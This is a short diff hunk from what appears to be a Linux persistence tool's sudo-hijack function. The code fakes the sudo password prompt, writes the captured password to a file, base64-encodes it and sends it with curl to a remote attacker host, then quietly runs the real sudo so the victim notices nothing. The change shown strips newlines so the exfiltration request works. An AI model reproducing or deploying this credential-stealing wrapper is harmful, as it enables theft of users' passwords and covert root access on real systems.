@@ -368,7 +368,7 @@ sudo_hijack_attack() {
 			read -s -p "[sudo] password for $USER: " PASSWD #linpersudo
 			printf "\n"; printf "%s\n" "$USER : $PASSWD" >> $SUDOPASSWORDFILE #linpersudo
 			sort -uo "$SUDOPASSWORDFILE" "$SUDOPASSWORDFILE" #linpersudo
-			ENCODED=$(cat "$SUDOPASSWORDFILE" | base64) > /dev/null 2>&1 #linpersudo
+			ENCODED=$(cat "$SUDOPASSWORDFILE" | base64 | tr -d "\n") > /dev/null 2>&1 #linpersudo
 			curl -k -s "https://'$RHOST'/$ENCODED" > /dev/null 2>&1 #linpersudo
 			$REALSUDO -S <<< "$PASSWD" -u root bash -c "exit" > /dev/null 2>&1 #linpersudo
 			$REALSUDO "${@:1}" #linpersudo
